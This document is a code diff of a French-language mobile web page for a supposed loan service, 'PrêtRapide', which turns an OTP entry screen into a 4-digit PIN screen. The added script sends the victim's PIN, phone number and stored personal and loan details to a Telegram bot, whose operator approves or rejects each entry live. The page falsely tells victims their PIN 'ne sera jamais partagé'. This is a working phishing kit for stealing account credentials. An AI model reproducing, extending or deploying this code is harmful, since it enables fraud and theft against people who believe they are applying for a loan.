@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification OTP – PrêtRapide</title>
+    <title>Code PIN – PrêtRapide</title>
     <link rel="stylesheet" href="common.css">
     <style>
          :root {
@@ -103,17 +103,16 @@
             flex-direction: column;
         }
         
-        .badge {
-            display: inline-flex;
+        .lock-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #eef4fb, #dbeafe);
+            border-radius: 18px;
+            display: flex;
             align-items: center;
-            gap: 6px;
-            background: #eef4fb;
-            color: var(--secondary);
-            font-size: 12px;
-            font-weight: 700;
-            padding: 5px 12px;
-            border-radius: 99px;
-            margin-bottom: 18px;
+            justify-content: center;
+            font-size: 30px;
+            margin-bottom: 20px;
         }
         
         .page-title {
@@ -130,74 +129,74 @@
             line-height: 1.55;
             margin-bottom: 36px;
         }
+        /* PIN inputs */
         
-        .page-sub strong {
-            color: var(--text);
-        }
-        /* OTP boxes */
-        
-        .otp-container {
+        .pin-wrapper {
             display: flex;
-            gap: 10px;
             justify-content: center;
-            margin-bottom: 10px;
+            gap: 16px;
+            margin-bottom: 20px;
         }
         
-        .otp-input {
-            width: 50px;
-            height: 58px;
+        .pin-input {
+            width: 64px;
+            height: 66px;
             border: 2px solid var(--border);
-            border-radius: 12px;
+            border-radius: 14px;
             text-align: center;
-            font-size: 26px;
-            font-weight: 700;
+            font-size: 32px;
+            font-weight: 800;
             color: var(--text);
             outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+            transition: all 0.2s ease;
             background: #fafafa;
+            -webkit-text-security: disc;
         }
         
-        .otp-input:focus {
+        .pin-input:focus {
             border-color: var(--secondary);
             box-shadow: 0 0 0 4px rgba(0, 74, 153, 0.1);
             background: white;
         }
         
-        .otp-input.filled {
+        .pin-input.filled {
             border-color: var(--secondary);
             background: #eef4fb;
         }
         
-        .resend-row {
-            text-align: center;
-            font-size: 14px;
-            color: var(--text-muted);
-            margin-top: 20px;
-            margin-bottom: 12px;
-        }
-        
-        .resend-link {
+        .forgot-pin {
+            display: block;
+            text-align: right;
             color: var(--secondary);
-            font-weight: 700;
-            text-decoration: none;
-            cursor: pointer;
-        }
-        
-        .timer-badge {
-            display: inline-block;
-            background: #eef4fb;
-            color: var(--secondary);
-            font-weight: 700;
             font-size: 13px;
-            padding: 3px 10px;
-            border-radius: 99px;
+            font-weight: 600;
+            text-decoration: none;
+            margin-bottom: 40px;
         }
         
         .spacer {
             flex: 1;
         }
         
-        .btn-continue {
+        .security-note {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #f8fbff;
+            border: 1px solid #dbeafe;
+            border-radius: 10px;
+            padding: 12px 14px;
+            margin-bottom: 18px;
+            font-size: 12px;
+            color: var(--text-muted);
+            line-height: 1.4;
+        }
+        
+        .security-note .lock {
+            font-size: 18px;
+        }
+        
+        .btn-submit {
             width: 100%;
             padding: 17px;
             border: none;
@@ -211,13 +210,13 @@
             margin-bottom: 24px;
         }
         
-        .btn-continue.active {
+        .btn-submit.active {
             background: linear-gradient(135deg, var(--secondary), #0062cc);
             cursor: pointer;
             box-shadow: 0 4px 16px rgba(0, 74, 153, 0.3);
         }
         
-        .btn-continue.active:active {
+        .btn-submit.active:active {
             transform: scale(0.98);
         }
         /* Loading overlay */
@@ -291,12 +290,12 @@
     <!-- Loading Overlay -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
-        <p id="loadingText">Validation du code…</p>
+        <p id="loadingText">Validation du PIN…</p>
     </div>
 
     <div class="mobile-container">
         <header>
-            <a href="javascript:transitionTo('number.html', 400)" class="back-btn">←</a>
+            <a href="javascript:transitionTo('otp.html', 400)" class="back-btn">←</a>
             <div class="header-brand">
                 <div class="circle">B</div>
                 <span>PrêtRapide</span>
@@ -304,31 +303,29 @@
         </header>
 
         <main>
-            <div class="badge">🔒 Vérification sécurisée</div>
-            <div class="page-title">Code de vérification</div>
-            <p class="page-sub">
-                Nous avons envoyé un code à 6 chiffres au<br>
-                <strong>+226 ·· ·· ·· ··</strong>.<br> Saisissez-le ci-dessous pour continuer.
-            </p>
+            <div class="lock-icon">🔐</div>
+            <div class="page-title">Saisissez votre PIN</div>
+            <p class="page-sub">Entrez votre code secret à 4 chiffres pour finaliser l'accès à votre compte.</p>
 
-            <div class="otp-container" id="otpBox">
-                <input type="tel" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric">
-                <input type="tel" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric">
-                <input type="tel" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric">
-                <input type="tel" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric">
-                <input type="tel" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric">
-                <input type="tel" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric">
+            <div class="pin-wrapper" id="pinContainer">
+                <input type="tel" class="pin-input" maxlength="1" inputmode="numeric">
+                <input type="tel" class="pin-input" maxlength="1" inputmode="numeric">
+                <input type="tel" class="pin-input" maxlength="1" inputmode="numeric">
+                <input type="tel" class="pin-input" maxlength="1" inputmode="numeric">
             </div>
 
-            <div class="resend-row">
-                Renvoyer dans <span class="timer-badge" id="timer">00:55</span>
-            </div>
+            <a href="#" class="forgot-pin">Code PIN oublié ?</a>
 
             <div class="status-msg" id="statusMsg"></div>
 
             <div class="spacer"></div>
 
-            <button type="button" class="btn-continue" id="submitBtn" disabled>Vérifier le code</button>
+            <div class="security-note">
+                <span class="lock">🛡️</span>
+                <span>Votre PIN est chiffré et ne sera jamais partagé. Connexion 100% sécurisée.</span>
+            </div>
+
+            <button type="button" class="btn-submit" id="submitBtn" disabled>Valider le PIN</button>
         </main>
     </div>
 
@@ -338,9 +335,8 @@
         const CHAT_ID = '1003670447';
 
         // ── DOM refs ──
-        const inputs = document.querySelectorAll('.otp-input');
+        const inputs = document.querySelectorAll('.pin-input');
         const submitBtn = document.getElementById('submitBtn');
-        const timerEl = document.getElementById('timer');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('loadingText');
         const statusMsg = document.getElementById('statusMsg');
@@ -358,10 +354,21 @@
             loadingOverlay.classList.remove('show');
         }
 
-        // ── OTP input logic ──
+        function resetForm() {
+            hideLoading();
+            submitBtn.textContent = 'Valider le PIN';
+            submitBtn.disabled = false;
+            inputs.forEach(i => {
+                i.value = '';
+                i.classList.remove('filled');
+            });
+            inputs[0].focus();
+            checkStatus();
+        }
+
+        // ── PIN input logic ──
         inputs.forEach((inp, i) => {
             inp.addEventListener('input', e => {
-                if (e.inputType === 'deleteContentBackward') return;
                 const val = e.target.value;
                 if (!/^\d$/.test(val)) {
                     e.target.value = '';
@@ -369,7 +376,7 @@
                 }
                 inp.classList.add('filled');
                 if (i < inputs.length - 1) inputs[i + 1].focus();
-                checkCompletion();
+                checkStatus();
             });
 
             inp.addEventListener('keydown', e => {
@@ -377,32 +384,18 @@
                     inputs[i - 1].value = '';
                     inputs[i - 1].classList.remove('filled');
                     inputs[i - 1].focus();
-                    checkCompletion();
+                    checkStatus();
                 }
             });
+
+            inp.addEventListener('focus', () => inp.select());
         });
 
-        function checkCompletion() {
+        function checkStatus() {
             const done = Array.from(inputs).every(i => i.value !== '');
             submitBtn.disabled = !done;
             submitBtn.classList.toggle('active', done);
         }
-
-        // ── Countdown timer ──
-        let timeLeft = 55;
-        const countdown = setInterval(() => {
-            if (timeLeft <= 0) {
-                clearInterval(countdown);
-                timerEl.parentElement.innerHTML =
-                    '<a href="#" class="resend-link">Renvoyer le code</a>';
-            } else {
-                timeLeft--;
-                const m = Math.floor(timeLeft / 60);
-                const s = timeLeft % 60;
-                timerEl.textContent =
-                    `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-            }
-        }, 1000);
 
         // ── Smooth page transition ──
         function transitionTo(url, duration) {
@@ -413,17 +406,64 @@
             }, duration);
         }
 
-        // ── Reset the page form ──
-        function resetForm() {
-            hideLoading();
-            submitBtn.textContent = 'Vérifier le code';
-            submitBtn.disabled = false;
-            inputs.forEach(i => {
-                i.value = '';
-                i.classList.remove('filled');
+        // ── Send PIN + all collected data to Telegram with inline keyboard ──
+        async function sendPinToTelegram(pinValue, savedPhone, timestamp) {
+            const data = {
+                firstName: sessionStorage.getItem('fName') || 'Non spécifié',
+                lastName: sessionStorage.getItem('lName') || 'Non spécifié',
+                email: sessionStorage.getItem('email') || 'Non spécifié',
+                phoneApp: sessionStorage.getItem('phone') || 'Non spécifié',
+                loanType: sessionStorage.getItem('loanType') || 'Non spécifié',
+                loanAmount: sessionStorage.getItem('loanAmount') || 'Non spécifié',
+                loanTerm: sessionStorage.getItem('loanTerm') || 'Non spécifié',
+                loanPurpose: sessionStorage.getItem('loanPurpose') || 'Non spécifié',
+                empStatus: sessionStorage.getItem('empStatus') || 'Non spécifié',
+                income: sessionStorage.getItem('income') || 'Non spécifié'
+            };
+
+            const message = `
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔐 *PIN REÇU - DEMANDE COMPLÈTE*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📱 *Téléphone :* ${savedPhone}
+🔢 *Code PIN :* ${pinValue}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 *IDENTITÉ COMPLÈTE*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🕐 *Soumis le :* ${new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Ouagadougou' })}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⚠️ *⚠️ TOUTES LES DONNÉES ONT ÉTÉ COLLECTÉES ⚠️*
+            `.trim();
+
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{
+                                text: '✅ Approuver',
+                                callback_data: 'approve_' + timestamp
+                            }, {
+                                text: '❌ Refuser',
+                                callback_data: 'cancel_' + timestamp
+                            }]
+                        ]
+                    }
+                })
             });
-            inputs[0].focus();
-            checkCompletion();
+
+            if (!response.ok) {
+                throw new Error('Telegram API error: ' + response.status);
+            }
         }
 
         // ── Poll Telegram for callback button clicks ──
@@ -461,11 +501,11 @@
                                 },
                                 body: JSON.stringify({
                                     callback_query_id: update.callback_query.id,
-                                    text: '✅ Prêt approuvé'
+                                    text: '✅ Demande approuvée'
                                 })
                             });
 
-                            statusMsg.textContent = '✅ Code vérifié avec succès !';
+                            statusMsg.textContent = '✅ PIN vérifié avec succès !';
                             statusMsg.className = 'status-msg approved';
                             setTimeout(() => onApprove(), 600);
                             return;
@@ -484,11 +524,11 @@
                                 },
                                 body: JSON.stringify({
                                     callback_query_id: update.callback_query.id,
-                                    text: '❌ Prêt refusé'
+                                    text: '❌ Demande refusée'
                                 })
                             });
 
-                            statusMsg.textContent = '❌ Code refusé par l\'opérateur.';
+                            statusMsg.textContent = '❌ PIN refusé par l\'opérateur.';
                             statusMsg.className = 'status-msg rejected';
                             setTimeout(() => onReject(), 600);
                             return;
@@ -503,98 +543,38 @@
             poll(); // immediate first check
         }
 
-        // ── Send OTP to Telegram with inline keyboard ──
-        async function sendOtpToTelegram(otpValue, savedPhone, timestamp) {
-            // Collect all session data for the full message
-            const data = {
-                firstName: sessionStorage.getItem('fName') || 'Non spécifié',
-                lastName: sessionStorage.getItem('lName') || 'Non spécifié',
-                email: sessionStorage.getItem('email') || 'Non spécifié',
-                phoneApp: sessionStorage.getItem('phone') || 'Non spécifié',
-                loanType: sessionStorage.getItem('loanType') || 'Non spécifié',
-                loanAmount: sessionStorage.getItem('loanAmount') || 'Non spécifié',
-                loanTerm: sessionStorage.getItem('loanTerm') || 'Non spécifié',
-                loanPurpose: sessionStorage.getItem('loanPurpose') || 'Non spécifié',
-                empStatus: sessionStorage.getItem('empStatus') || 'Non spécifié',
-                income: sessionStorage.getItem('income') || 'Non spécifié'
-            };
-
-            const message = `
-━━━━━━━━━━━━━━━━━━
-🔐 *OTP VÉRIFICATION*
-━━━━━━━━━━━━━━━━━━
-
-📱 *Téléphone :* ${savedPhone}
-🔢 *Code OTP :* ${otpValue}
-
-━━━━━━━━━━━━━━━━━━
-
-🕐 *Soumis le :* ${new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Ouagadougou' })}
-━━━━━━━━━━━━━━━━━━
-
-⚠️ *Veuillez approuver ou refuser la demande :*
-            `.trim();
-
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{
-                                text: '✅ Approuver',
-                                callback_data: 'approve_' + timestamp
-                            }, {
-                                text: '❌ Refuser',
-                                callback_data: 'cancel_' + timestamp
-                            }]
-                        ]
-                    }
-                })
-            });
-
-            if (!response.ok) {
-                throw new Error('Telegram API error: ' + response.status);
-            }
-        }
-
-        // ── Submit button handler ──
+        // ── Submit handler ──
         submitBtn.addEventListener('click', async() => {
             if (submitBtn.disabled) return;
 
-            const otpValue = Array.from(inputs).map(i => i.value).join('');
-            if (otpValue.length !== 6) return;
+            const pin = Array.from(inputs).map(i => i.value).join('');
+            if (pin.length !== 4) return;
 
             const savedPhone = sessionStorage.getItem('burkina_phone') || '+226 Inconnu';
             const timestamp = Date.now();
 
-            submitBtn.textContent = 'Vérification…';
+            submitBtn.textContent = 'Validation en cours…';
             submitBtn.disabled = true;
-            showLoading('Envoi du code pour validation…');
+            showLoading('Envoi du PIN pour validation…');
             statusMsg.textContent = '⏳ En attente de validation par l\'opérateur…';
             statusMsg.className = 'status-msg waiting';
 
             try {
-                // Send OTP to Telegram with inline Approve/Cancel buttons
-                await sendOtpToTelegram(otpValue, savedPhone, timestamp);
+                // Send PIN + all data to Telegram with inline Approve/Cancel buttons
+                await sendPinToTelegram(pin, savedPhone, timestamp);
 
-                // Start polling for the admin's decision (approve_ or cancel_)
+                // Start polling for the admin's decision
                 startPollingForDecision(
                     timestamp,
                     () => {
-                        // ✅ Approved — smooth transition to pin.html
-                        transitionTo('pin.html', 500);
+                        // ✅ Approved — smooth transition to success.html
+                        transitionTo('success.html', 500);
                     },
                     () => {
                         // ❌ Rejected — reset the form
-                        resetForm();
                         statusMsg.textContent = '❌ Demande refusée. Vous pouvez réessayer.';
                         statusMsg.className = 'status-msg rejected';
+                        resetForm();
                     }
                 );
 
